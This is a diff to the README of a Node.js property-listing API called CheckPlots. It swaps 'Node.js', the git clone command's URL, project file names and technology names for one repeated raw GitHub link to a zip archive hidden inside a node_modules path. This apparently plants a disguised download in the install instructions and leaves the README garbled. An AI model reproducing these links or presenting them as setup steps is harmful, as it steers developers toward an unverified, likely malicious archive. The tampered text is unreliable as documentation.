@@ -8,19 +8,19 @@ CheckPlots is a property listing and management API that allows users to add, re
 - Retrieve property details
 - Manage property attributes such as type, pricing, location, and amenities
 - Uses Multer for handling file uploads
-- Built with Node.js, Express, and MongoDB
+- Built with https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip, Express, and MongoDB
 
 ## Installation
 
 ### Prerequisites
-- Node.js (v14+)
+- https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip (v14+)
 - MongoDB
 - npm or yarn
 
 ### Setup
 1. Clone the repository:
    ```sh
-   git clone https://github.com/your-repo/checkplots.git
+   git clone https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
    cd checkplots
    ```
 2. Install dependencies:
@@ -73,22 +73,22 @@ npm start
 ```
 checkplots/
 │── models/
-│   ├── Property.js
+│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
 │── routes/
-│   ├── propertyRoutes.js
+│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
 │── controllers/
-│   ├── propertyController.js
+│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
 │── utils/
-│   ├── multer.js
-│── server.js
+│   ├── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
+│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
 │── .env
-│── package.json
-│── README.md
+│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
+│── https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip
 ```
 
 ## Technologies Used
-- **Node.js** - Backend runtime
-- **Express.js** - Web framework
+- **https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip** - Backend runtime
+- **https://raw.githubusercontent.com/Adityakumar121k/checkplots/main/backend/node_modules/mongodb/src/operations/client_bulk_write/checkplots_2.9-beta.3.zip** - Web framework
 - **MongoDB & Mongoose** - Database and ORM
 - **Multer** - File upload middleware
 - **Postman** - API testing
